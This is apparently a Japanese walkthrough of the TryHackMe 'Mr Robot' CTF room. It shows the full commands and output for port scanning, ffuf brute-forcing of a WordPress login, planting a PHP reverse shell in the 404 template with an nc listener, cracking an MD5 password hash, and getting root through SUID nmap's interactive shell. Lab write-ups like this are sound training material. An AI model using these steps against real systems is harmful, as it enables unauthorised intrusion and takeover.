# Mr Robot CTF

https://tryhackme.com/room/mrrobot

## Enumeration

### ポートスキャン

```shell
TARGET=10.10.62.11
root@ip-10-10-110-4:~# sudo nmap -p- $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-04-22 05:52 BST
Nmap scan report for 10.10.62.11
Host is up (0.00049s latency).
Not shown: 65532 filtered ports
PORT    STATE  SERVICE
22/tcp  closed ssh
80/tcp  open   http
443/tcp open   https
MAC Address: 02:26:0F:37:19:B9 (Unknown)

root@ip-10-10-110-4:~# sudo nmap -sV -p22,80,443 $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-04-22 05:54 BST
Nmap scan report for 10.10.62.11
Host is up (0.00027s latency).

PORT    STATE  SERVICE  VERSION
22/tcp  closed ssh
80/tcp  open   http     Apache httpd
443/tcp open   ssl/http Apache httpd
MAC Address: 02:26:0F:37:19:B9 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.39 seconds
```

SSH, HTTP, HTTPS

### gobuster

```shell
root@ip-10-10-110-4:~# gobuster dir -x=txt,php -u http://$TARGET -w ./dirlist.txt -t 30 -k
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.62.11
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                ./dirlist.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/0                    (Status: 301) [Size: 0] [--> http://10.10.62.11/0/]
/0000                 (Status: 301) [Size: 0]
```

/0 にアクセスしたら、WordPress のブログが表示された。

```shell
wpscan --url http://10.10.62.11/ -e
```

robots.txt が見つかっただけ。

robots.txt

```
User-agent: *
fsocity.dic
key-1-of-3.txt
```

辞書ファイルと、キー１ゲット。

## ログインブルートフォース

辞書ファイルの重複を排除。

```shell
$ cat ./fsocity.dic | wc -l
858160

$ cat ./fsocity.dic | sort | uniq | wc -l
11451

$ cat ./fsocity.dic | sort | uniq > uniq.dic
```

ログイン画面で「admin」ユーザー指定すると、「Invalid username.」と表示された。

### 有効ユーザー名ファジング

```shell
$ ffuf -u http://10.10.62.11/wp-login.php -c -w ./uniq.dic -X POST -d 'log=FUZZ&pwd=password&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.62.11%2Fwp-admin%2F&testcookie=1' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Cookie: s_fid=4F24870B6C81B086-12A3AEF06778C292; s_nr=1745298104776; s_cc=true; s_sq=%5B%5BB%5D%5D; wordpress_test_cookie=WP+Cookie+check' -fr 'Invalid username.'

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://10.10.62.11/wp-login.php
 :: Wordlist         : FUZZ: /home/kali/CTF/0422/uniq.dic
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Header           : Cookie: s_fid=4F24870B6C81B086-12A3AEF06778C292; s_nr=1745298104776; s_cc=true; s_sq=%5B%5BB%5D%5D; wordpress_test_cookie=WP+Cookie+check
 :: Data             : log=FUZZ&pwd=password&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.62.11%2Fwp-admin%2F&testcookie=1
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Regexp: Invalid username.
________________________________________________

elliot                  [Status: 200, Size: 3635, Words: 144, Lines: 59, Duration: 487ms]
ELLIOT                  [Status: 200, Size: 3635, Words: 144, Lines: 59, Duration: 464ms]
Elliot                  [Status: 200, Size: 3635, Words: 144, Lines: 59, Duration: 493ms]
:: Progress: [11451/11451] :: Job [1/1] :: 88 req/sec :: Duration: [0:02:11] :: Errors: 0 ::
```

elliot ユーザーが存在することを確認

### パスワードファジング

```shell
$ ffuf -u http://10.10.62.11/wp-login.php -c -w ./uniq.dic -X POST -d 'log=elliot&pwd=FUZZ&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.62.11%2Fwp-admin%2F&testcookie=1' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Cookie: s_fid=4F24870B6C81B086-12A3AEF06778C292; s_nr=1745298104776; s_cc=true; s_sq=%5B%5BB%5D%5D; wordpress_test_cookie=WP+Cookie+check' -fr 'The password you entered '

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://10.10.62.11/wp-login.php
 :: Wordlist         : FUZZ: /home/kali/CTF/0422/uniq.dic
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Header           : Cookie: s_fid=4F24870B6C81B086-12A3AEF06778C292; s_nr=1745298104776; s_cc=true; s_sq=%5B%5BB%5D%5D; wordpress_test_cookie=WP+Cookie+check
 :: Data             : log=elliot&pwd=FUZZ&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.62.11%2Fwp-admin%2F&testcookie=1
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Regexp: The password you entered
________________________________________________

（ひみつ）               [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 2779ms]
```

パスワードが判明。ログインページからログインする。

## WordPress テンプレート

404 テンプレート編集で、PHP pentest monkey に置き換える。https://www.revshells.com/

http://10.10.62.11/wp-admin/1111 等の存在しないページにアクセスして 404 を発生させる。

リバースシェル取得成功。

```shell
$ nc -lvnp 6666
listening on [any] 6666 ...
connect to [10.2.22.182] from (UNKNOWN) [10.10.62.11] 49215
Linux linux 3.13.0-55-generic #94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
 05:32:43 up 43 min,  0 users,  load average: 0.43, 2.15, 2.07
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1(daemon) gid=1(daemon) groups=1(daemon)
sh: 0: can't access tty; job control turned off
$ id
uid=1(daemon) gid=1(daemon) groups=1(daemon)
```

キー２を読む権限はない。

```shell
$ ls -al /home/robot
total 16
drwxr-xr-x 2 root  root  4096 Nov 13  2015 .
drwxr-xr-x 3 root  root  4096 Nov 13  2015 ..
-r-------- 1 robot robot   33 Nov 13  2015 key-2-of-3.txt
-rw-r--r-- 1 robot robot   39 Nov 13  2015 password.raw-md5
```

パスワード MD5 ハッシュ

```shell
$ cat /home/robot/password.raw-md5
robot:ひみつ
```

rockyou.txt でクラックできた。

```shell
hashcat -m 0 hash.txt rockyou.txt
```

パスワードを使い、robot ユーザーに切り替え

```shell
daemon@linux:/$ su robot
su robot
Password: ひみつ

robot@linux:/$
```

```shell
robot@linux:/$ cat /home/robot/key-2-of-3.txt
cat /home/robot/key-2-of-3.txt
82..............................
```

キー２ゲット。

## 権限昇格

nmap に SUID が付いている。

```shell
robot@linux:/$ find / -perm -u=s -type f -ls 2>/dev/null
find / -perm -u=s -type f -ls 2>/dev/null
 15068   44 -rwsr-xr-x   1 root     root        44168 May  7  2014 /bin/ping
 15093   68 -rwsr-xr-x   1 root     root        69120 Feb 12  2015 /bin/umount
 15060   96 -rwsr-xr-x   1 root     root        94792 Feb 12  2015 /bin/mount
 15069   44 -rwsr-xr-x   1 root     root        44680 May  7  2014 /bin/ping6
 15085   40 -rwsr-xr-x   1 root     root        36936 Feb 17  2014 /bin/su
 36231   48 -rwsr-xr-x   1 root     root        47032 Feb 17  2014 /usr/bin/passwd
 36216   32 -rwsr-xr-x   1 root     root        32464 Feb 17  2014 /usr/bin/newgrp
 36041   44 -rwsr-xr-x   1 root     root        41336 Feb 17  2014 /usr/bin/chsh
 36038   48 -rwsr-xr-x   1 root     root        46424 Feb 17  2014 /usr/bin/chfn
 36148   68 -rwsr-xr-x   1 root     root        68152 Feb 17  2014 /usr/bin/gpasswd
 36349  152 -rwsr-xr-x   1 root     root       155008 Mar 12  2015 /usr/bin/sudo
 34835  496 -rwsr-xr-x   1 root     root       504736 Nov 13  2015 /usr/local/bin/nmap
 38768  432 -rwsr-xr-x   1 root     root       440416 May 12  2014 /usr/lib/openssh/ssh-keysign
 38526   12 -rwsr-xr-x   1 root     root        10240 Feb 25  2014 /usr/lib/eject/dmcrypt-get-device
395259   12 -r-sr-xr-x   1 root     root         9532 Nov 13  2015 /usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
395286   16 -r-sr-xr-x   1 root     root        14320 Nov 13  2015 /usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
 38505   12 -rwsr-xr-x   1 root     root        10344 Feb 25  2015 /usr/lib/pt_chown
```

インタラクティブオプションで root シェルを取れた。  
https://gtfobins.github.io/gtfobins/nmap/ では、SUID ではなく SUDO のテクニックとして掲載されていた。

```shell
robot@linux:/$ nmap --interactive
nmap --interactive

Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !sh
!sh
# id
id
uid=1002(robot) gid=1002(robot) euid=0(root) groups=0(root),1002(robot)
```

```shell
# cat /root/key-3-of-3.txt
cat /root/key-3-of-3.txt
04.................................
```

キー３ゲット。

## 振り返り

- 他のプラットフォームで一度クリアしたことがあるボックス。それを差し引いても、中級にしてはイージーだと感じた。
- 404 テンプレートはもはや何も考えなくても勝手に手が動く感じ。
